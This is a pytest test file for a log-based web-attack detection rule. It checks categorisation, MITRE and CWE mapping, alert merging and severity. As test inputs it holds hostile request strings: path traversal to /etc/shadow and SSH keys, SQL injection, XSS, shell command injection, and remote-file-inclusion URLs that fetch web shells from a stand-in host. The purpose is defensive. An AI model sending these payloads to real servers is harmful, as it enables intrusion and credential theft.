from datetime import timedelta
from ipaddress import ip_address
from pathlib import Path

import pytest
from pydantic import ValidationError

from logsentry.models import Severity
from logsentry.parsers import nginx
from logsentry.parsers.iis import W3CParser
from logsentry.rules.web_attack import WebAttack, category_result, request_worked

FIXTURES = Path(__file__).parent / "fixtures"
PATTERNS = Path(__file__).parent.parent / "config" / "web_patterns.yaml"
TRAVERSAL = (
    '203.0.113.60 - - [22/Oct/2026:14:00:00 +0000] "GET /dl?f=../../etc/passwd HTTP/1.1"'
    ' 404 153 "-" "curl/8.10.1"'
)


def make_rule(patterns_file=PATTERNS, group_gap_seconds=1800):
    config = {"patterns_file": patterns_file, "group_gap_seconds": group_gap_seconds}
    return WebAttack(WebAttack.Config.model_validate(config))


def run(rule, events):
    return [a for e in events for a in rule.process(e)]


def latest(alerts):
    """Each alert as it ended up: the rule returns an IP's alert again as it grows."""
    return list({(a.src_ip, a.first_seen): a for a in alerts}.values())


def requests(minutes, raw=TRAVERSAL, **update):
    """The same request sent at each of `minutes` after the first one."""
    first = nginx.parse_line(raw).model_copy(update=update)
    return [first.model_copy(update={"ts": first.ts + timedelta(minutes=m)}) for m in minutes]


def test_attacks_fixture_is_one_alert_listing_its_categories(load_events):
    events = load_events("nginx_attacks.log")
    # the last line is a TLS handshake with no request line, so it is skipped
    alerts = run(make_rule(), events)
    assert len(alerts) == 6  # one update per attack request...
    (alert,) = latest(alerts)  # ...all of the same alert
    assert (alert.rule_id, alert.rule_name, alert.technique_id, alert.event_count) == (
        "web_attack",
        "Web attack",
        "T1190",
        6,
    )
    assert alert.categories == ["Path traversal / LFI", "SQL injection", "XSS"]
    assert alert.summary == (
        "Path traversal / LFI, SQL injection, XSS in 6 requests from 203.0.113.9"
        " (HTTP 400, 200, 500)"
    )
    assert alert.severity == Severity.HIGH  # medium bases, raised by the 200s
    assert (alert.first_seen, alert.last_seen) == (events[0].ts, events[5].ts)
    first = alert.matches[0]
    assert (first.category, first.pattern, first.matched, first.http_status) == (
        "path_traversal",
        "dot_dot_slash",
        "../",
        400,
    )


def test_fires_on_iis_unicode_traversal():
    parser = W3CParser()
    lines = (FIXTURES / "iis_attacks.log").read_text().splitlines()
    (alert,) = latest(run(make_rule(), [e for raw in lines if (e := parser.parse_line(raw))]))
    # ..%5c.. decodes to ..\.. on the way to cmd.exe: traversal and command execution
    assert alert.categories == ["Path traversal / LFI", "Command injection"]
    # cmd.exe got a 200 once and a 502 once: mixed, not a success, so command injection
    # stays at its base (high) and no T1059
    assert [(r.name, r.result, r.severity) for r in alert.results] == [
        ("Path traversal / LFI", "mixed", Severity.MEDIUM),
        ("Command injection", "mixed", Severity.HIGH),
    ]
    assert (alert.severity, alert.result, alert.technique_id) == (Severity.HIGH, "mixed", "T1190")
    assert alert.event_count == 2


def test_iis_benign_fixture_does_not_fire():
    parser = W3CParser()
    lines = (FIXTURES / "iis_benign.log").read_text().splitlines()
    assert run(make_rule(), [e for raw in lines if (e := parser.parse_line(raw))]) == []


def test_benign_fixture_does_not_fire(load_events):
    assert run(make_rule(), load_events("nginx_benign.log")) == []


def test_scan_fixture_is_probing_and_scanner_user_agents(load_events):
    alerts = {str(a.src_ip): a for a in latest(run(make_rule(), load_events("nginx_scan.log")))}
    probe, nikto = alerts["203.0.113.12"], alerts["203.0.113.13"]
    assert (probe.categories, probe.technique_id, probe.tactic) == (
        ["Sensitive file probing"],
        "T1595.003",
        "Reconnaissance",
    )
    assert probe.severity == Severity.LOW  # low base; 404s can't go lower
    assert (nikto.categories, nikto.technique_id) == (["Scanner user-agent"], "T1595.002")
    assert (nikto.result, nikto.severity) == ("mixed", Severity.LOW)  # one 200, two 404s


def test_categories_with_different_techniques_are_all_listed(load_events):
    env = requests([0], raw=TRAVERSAL.replace("/dl?f=../../etc/passwd", "/.env"))
    (alert,) = latest(run(make_rule(), [*requests([0]), *env]))
    assert alert.technique_id == "T1190, T1595.003"
    assert alert.tactic == "Initial Access, Reconnaissance"


def test_requests_less_than_the_gap_apart_merge_into_one_alert():
    alerts = run(make_rule(), requests([0, 29, 58]))  # 58 min in all, never 30 min quiet
    assert {a.first_seen for a in alerts} == {alerts[0].first_seen}  # updates of one alert
    assert [a.event_count for a in alerts] == [1, 2, 3]
    assert alerts[-1].last_seen - alerts[-1].first_seen == timedelta(minutes=58)


def test_a_quiet_gap_longer_than_the_window_starts_a_new_alert():
    alerts = latest(run(make_rule(), requests([0, 31])))
    assert [a.event_count for a in alerts] == [1, 1]


def test_the_gap_is_configurable():
    assert len(latest(run(make_rule(group_gap_seconds=600), requests([0, 11])))) == 2
    assert len(latest(run(make_rule(group_gap_seconds=600), requests([0, 9])))) == 1


def test_a_steady_attack_is_one_alert_not_one_per_cooldown():
    # the old bug: a fixed 300 s cooldown cut a request-a-minute attack into 4 alerts
    (alert,) = latest(run(make_rule(), requests(range(20))))
    assert alert.event_count == 20


def test_merged_alert_takes_the_highest_severity_and_every_category():
    sqli = requests([5], raw=TRAVERSAL.replace("/dl?f=../../etc/passwd", "/i?id=1+union+select+1"))
    sqli = [e.model_copy(update={"http_status": 200}) for e in sqli]
    (alert,) = latest(run(make_rule(), [*requests([0]), *sqli, *requests([10])]))
    assert alert.categories == ["Path traversal / LFI", "SQL injection"]
    assert alert.severity == Severity.HIGH  # the traversal 404s alone would be low
    assert [m.category for m in alert.matches] == ["path_traversal", "sqli", "path_traversal"]


def test_other_ips_get_their_own_alert():
    other = requests([1], src_ip="203.0.113.61")
    alerts = latest(run(make_rule(), [*requests([0, 2]), *other]))
    assert sorted((str(a.src_ip), a.event_count) for a in alerts) == [
        ("203.0.113.60", 2),
        ("203.0.113.61", 1),
    ]


def test_one_request_in_two_categories_counts_once(load_events):
    event = load_events("nginx_benign.log")[0].model_copy(
        update={"url_query": "id=1%27%20or%201=1--%20<script>alert(1)</script>"}
    )
    (alert,) = run(make_rule(), [event])
    assert (alert.event_count, alert.categories) == (1, ["SQL injection", "XSS"])


def test_long_hostile_url_is_fast(load_events):
    # ReDoS guard: a 4 KB URL of near-matches must not hang the rule
    event = load_events("nginx_benign.log")[0]
    event = event.model_copy(update={"url_query": "q=" + "<on" * 1300 + "' u" * 100})
    assert run(make_rule(), [event]) == []


def test_matched_text_is_cleaned_and_capped(load_events):
    event = load_events("nginx_benign.log")[0].model_copy(
        update={"url_query": "f=http://198.51.100.5/" + "a%1b%07" * 80 + ".php"}
    )
    (alert,) = run(make_rule(), [event])
    matched = alert.matches[0].matched
    assert len(matched) == 100 and "\x1b" not in matched and "\x07" not in matched


@pytest.mark.parametrize(
    "patterns",
    [
        "categories: {x: {name: X, technique_id: T1, tactic: t, severity: medium,"
        " patterns: [{id: a, field: request, regex: '(unclosed'}]}}",
        "categories: {x: {name: X, technique_id: T1, tactic: t, severity: medium,"
        " patterns: [{id: a, field: referer, regex: 'a'}]}}",
        "categories: {x: {name: X, technique_id: T1, tactic: t, severity: urgent,"
        " patterns: [{id: a, field: request, regex: 'a'}]}}",
        "categories: {x: {name: X, technique_id: T1, tactic: t, severity: medium, patterns: []}}",
        "categories: {}",
        "nothing: here",
    ],
)
def test_bad_patterns_file_is_rejected(tmp_path, patterns):
    path = tmp_path / "web_patterns.yaml"
    path.write_text(patterns)
    with pytest.raises(ValidationError):
        make_rule(path)


def test_missing_patterns_file_is_rejected(tmp_path):
    with pytest.raises(ValidationError, match="can't read"):
        make_rule(tmp_path / "nope.yaml")


@pytest.mark.parametrize(
    ("statuses", "expected"),
    [
        ([200, 204], "succeeded"),
        ([302, 404, 500], "blocked"),
        ([404, 200], "mixed"),
        ([None], "blocked"),
    ],
)
def test_result_from_statuses_alone(statuses, expected):
    events = [
        e.model_copy(update={"http_status": s})
        for e, s in zip(requests(range(len(statuses))), statuses, strict=True)
    ]
    (alert,) = latest(run(make_rule(), events))
    assert alert.result == expected
    assert alert.confidence == (None if expected == "blocked" else "likely")


def test_matches_keep_the_request_and_user_agent_for_display():
    long_ua = "Mozilla/5.0 \x1b[31m" + "x" * 400
    (alert,) = run(make_rule(), requests([0], user_agent=long_ua))
    m = alert.matches[0]
    assert (m.name, m.request) == ("Path traversal / LFI", "/dl?f=../../etc/passwd")
    assert m.request.partition(m.matched)[1] == "../"  # the template highlights this part
    assert len(m.user_agent) == 300 and "\x1b" not in m.user_agent


CMD = (
    '203.0.113.70 - - [22/Oct/2026:14:00:00 +0000] "GET /ping?host=1;id HTTP/1.1"'
    ' 200 512 "-" "curl/8.10.1"'
)
RFI = (
    '203.0.113.71 - - [22/Oct/2026:14:00:00 -0400] "GET /p.php?page=http://198.51.100.5/x.php'
    ' HTTP/1.1" 302 2 "-" "curl/8.10.1"'
)


def hits(rule, events):
    return [(e, rule.classify(e)) for e in events]


@pytest.mark.parametrize(
    ("worked", "expected"),
    [
        ([(True, "confirmed"), (False, None)], ("succeeded", "confirmed")),  # proof wins
        ([(True, "likely"), (True, "likely")], ("succeeded", "likely")),
        ([(True, "likely"), (False, None)], ("mixed", "likely")),  # not a success
        ([(False, None), (False, "confirmed")], ("blocked", None)),
    ],
)
def test_category_result(worked, expected):
    assert category_result(worked) == expected


def test_a_2xx_the_usual_size_of_the_page_is_not_a_success():
    (event,) = requests([0], http_status=200, http_bytes=1843, url_path="/dl")
    assert request_worked(event, "path_traversal", {"/dl": 1843}, {}) == (False, None)
    assert request_worked(event, "path_traversal", {"/dl": 2}, {}) == (True, "likely")
    assert request_worked(event, "path_traversal", {}, {}) == (True, "likely")  # no baseline


def test_the_error_log_overrides_the_status_for_inclusions():
    (event,) = requests([0], http_status=200)
    key = (event.ts, event.raw)
    assert request_worked(event, "path_traversal", {}, {key: "failed"}) == (False, "confirmed")
    (rfi,) = requests([0], raw=RFI)
    assert request_worked(rfi, "rfi", {}, {(rfi.ts, rfi.raw): "succeeded"}) == (
        True,
        "confirmed",
    )
    # not an inclusion category: the error_log says nothing about it
    (cmd,) = requests([0], raw=CMD, http_status=404)
    assert request_worked(cmd, "command_injection", {}, {(cmd.ts, cmd.raw): "succeeded"}) == (
        False,
        None,
    )


def test_a_confirmed_rfi_is_critical_even_answered_302():
    rule = make_rule()
    events = requests([0, 1], raw=RFI)
    alert = rule.alert_for(hits(rule, events), {}, {(events[1].ts, events[1].raw): "succeeded"})
    assert (alert.severity, alert.result, alert.confidence) == (
        Severity.CRITICAL,
        "succeeded",
        "confirmed",
    )
    # without the proof, two 302s are blocked: base high - 1
    assert rule.alert_for(hits(rule, events)).severity == Severity.MEDIUM


def test_succeeded_command_injection_is_critical_and_adds_t1059():
    alert = latest(run(make_rule(), requests([0, 1], raw=CMD)))[0]
    assert (alert.severity, alert.result) == (Severity.CRITICAL, "succeeded")
    # ;id is a Unix shell command: T1059.004 too
    assert alert.technique_id == "T1190, T1059, T1059.004"
    assert alert.tactic == "Initial Access, Execution"


def test_mixed_command_injection_stays_at_its_base():
    events = [*requests([0], raw=CMD), *requests([1], raw=CMD, http_status=404)]
    (alert,) = latest(run(make_rule(), events))
    assert (alert.severity, alert.result, alert.technique_id) == (Severity.HIGH, "mixed", "T1190")


def test_alert_takes_its_highest_category():
    # traversal blocked (404: low), command injection succeeded (critical)
    # same IP: the CMD line's source, set as an address object like a parsed event's
    events = [*requests([0]), *requests([1], raw=CMD, src_ip=ip_address("203.0.113.60"))]
    (alert,) = latest(run(make_rule(), events))
    assert [(r.name, r.severity) for r in alert.results] == [
        ("Path traversal / LFI", Severity.LOW),
        ("Command injection", Severity.CRITICAL),
    ]
    assert alert.severity == Severity.CRITICAL


@pytest.mark.parametrize(
    ("ip", "internal"),
    [
        ("10.0.0.50", True),
        ("10.1.2.3", True),
        ("172.20.0.5", True),
        ("fd00::1", True),
        ("172.32.0.1", False),
        ("203.0.113.60", False),  # documentation range: is_private, but not RFC 1918
    ],
)
def test_internal_sources_get_a_badge_and_plus_one(ip, internal):
    (alert,) = run(make_rule(), requests([0], src_ip=ip))  # traversal 404: blocked, low
    assert alert.internal is internal
    assert alert.severity == (Severity.MEDIUM if internal else Severity.LOW)


def chain(alert):
    """The technique chain as text: "T1190 -> T1105, T1505.003"."""
    first = ", ".join(t.id for t in alert.techniques if not t.follow_on)
    then = ", ".join(t.id for t in alert.techniques if t.follow_on)
    return f"{first} -> {then}" if then else first


def with_path(raw, path_and_query):
    return raw.replace(raw.split('"GET ')[1].split(" HTTP")[0], path_and_query)


def succeeded(raw, minutes=(0,), confirmed_rfi=False):
    """The alert for `raw` sent at `minutes`, every request a success."""
    rule = make_rule()
    events = requests(list(minutes), raw=raw, http_status=200)
    proof = {(e.ts, e.raw): "succeeded" for e in events} if confirmed_rfi else {}
    return rule.alert_for(hits(rule, events), {}, proof)


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("/ping?host=1;id", "T1190 -> T1059, T1059.004"),
        ("/run?c=$(whoami)", "T1190 -> T1059, T1059.004"),
        ("/cgi-bin/x?cmd=/bin/sh%20-i", "T1190 -> T1059, T1059.004"),
        ("/scripts/..%5c../winnt/system32/cmd.exe?/c+dir", "T1190 -> T1083, T1059"),  # Windows
    ],
)
def test_succeeded_command_injection_chain(path, expected):
    assert chain(succeeded(with_path(CMD, path))) == expected


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("/p.php?page=http://198.51.100.5/x.php", "T1190 -> T1105"),
        ("/p.php?page=http://198.51.100.5/c99.php", "T1190 -> T1105, T1505.003"),
        ("/p.php?page=http://198.51.100.5/tools/shell_v2.txt", "T1190 -> T1105, T1505.003"),
        ("/p.php?page=http://198.51.100.5/a.txt&x=system(id)", "T1190 -> T1105, T1505.003"),
    ],
)
def test_succeeded_rfi_chain(path, expected):
    assert chain(succeeded(with_path(RFI, path), confirmed_rfi=True)) == expected


@pytest.mark.parametrize(
    ("path", "expected"),
    [
        ("/dl?f=../../etc/passwd", "T1190 -> T1083"),
        ("/dl?f=../../etc/shadow", "T1190 -> T1083, T1552.001"),
        # .env and wp-config.php are also sensitive-file probing (reconnaissance)
        ("/dl?f=../../var/www/.env", "T1190, T1595.003 -> T1083, T1552.001"),
        ("/dl?f=../wp-config.php", "T1190, T1595.003 -> T1083, T1552.001"),
        ("/dl?f=../../home/u/.ssh/id_rsa", "T1190 -> T1083, T1552.001"),
    ],
)
def test_succeeded_traversal_chain(path, expected):
    assert chain(succeeded(with_path(TRAVERSAL, path))) == expected


def test_follow_ons_need_the_category_to_succeed():
    rule = make_rule()
    mixed = [*requests([0], raw=CMD), *requests([1], raw=CMD, http_status=404)]
    assert chain(rule.alert_for(hits(rule, mixed))) == "T1190"  # mixed: no T1059
    rfi = requests([0], raw=RFI)  # a 302 with no error_log proof: blocked
    assert chain(rule.alert_for(hits(rule, rfi))) == "T1190"


def test_follow_on_condition_only_looks_at_requests_that_worked():
    # the traversal that reached /etc/shadow was refused; the one that worked read passwd
    rule = make_rule()
    shadow = requests([0], raw=with_path(TRAVERSAL, "/dl?f=../../etc/shadow"), http_status=403)
    passwd = requests([1], raw=with_path(TRAVERSAL, "/dl?f=../../etc/passwd"), http_status=200)
    proof = {(e.ts, e.raw): "failed" for e in shadow}  # an error_log failure is confirmed
    alert = rule.alert_for(hits(rule, [*shadow, *passwd]), {}, proof)
    assert alert.results[0].result == "mixed"
    assert chain(alert) == "T1190"


def test_techniques_carry_names_tactics_and_the_cwe():
    alert = succeeded(with_path(RFI, "/p.php?page=http://198.51.100.5/c99.php"), confirmed_rfi=True)
    assert [(t.id, t.name, t.tactic, t.follow_on) for t in alert.techniques] == [
        ("T1190", "Exploit Public-Facing Application", "Initial Access", False),
        ("T1105", "Ingress Tool Transfer", "Command and Control", True),
        ("T1505.003", "Server Software Component: Web Shell", "Persistence", True),
    ]
    (result,) = alert.results
    assert (result.cwe, result.follow_on) == ("CWE-98", ["T1105", "T1505.003"])
    assert alert.tactic == "Initial Access, Command and Control, Persistence"


def test_every_category_with_a_cwe_has_the_expected_one():
    cwes = {c.name: c.cwe for c in make_rule().config.categories.values()}
    assert {k: v for k, v in cwes.items() if v} == {
        "SQL injection": "CWE-89",
        "XSS": "CWE-79",
        "Path traversal / LFI": "CWE-22",
        "Remote file inclusion": "CWE-98",
        "Command injection": "CWE-78",
    }


@pytest.mark.parametrize(
    "bad",
    [
        "cwe: CWE22",  # missing the dash
        "follow_on: [{technique_id: T1, name: X, tactic: Y, when: '(oops'}]",
        "follow_on: [{technique_id: T1, tactic: Y}]",  # no name
    ],
)
def test_bad_cwe_or_follow_on_is_rejected(tmp_path, bad):
    path = tmp_path / "web_patterns.yaml"
    path.write_text(
        "categories: {x: {name: X, technique_id: T1190, technique_name: E, tactic: t,"
        " severity: medium, patterns: [{id: a, field: request, regex: 'a'}]}}\n"
    )
    assert make_rule(path)  # the base file is valid
    text = path.read_text().replace("severity: medium,", "severity: medium, " + bad + ",")
    path.write_text(text)
    with pytest.raises(ValidationError):
        make_rule(path)
